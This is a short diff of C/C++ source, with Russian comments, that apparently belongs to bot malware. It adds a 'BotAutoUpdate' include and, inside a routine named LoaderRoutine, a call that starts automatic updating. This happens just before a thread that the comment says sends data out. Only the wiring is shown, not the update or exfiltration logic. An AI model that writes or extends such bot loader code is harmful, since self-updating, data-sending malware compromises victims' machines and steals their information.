@@ -21,6 +21,9 @@
 #include "DbgRpt.h"
 #include "Modules.h"
 
+
+#include "BotAutoUpdate.h"
+
 #include "BotDebug.h"
 
 
@@ -120,6 +123,11 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 		pExitProcess(1);
 		return 0; // для компилятора
 	}
+
+	// Запускаем автообновление
+	#ifdef BotAutoUpdateH
+		StartAutoUpdate();
+	#endif
 
 	// Стартуем поток отправки данных
 
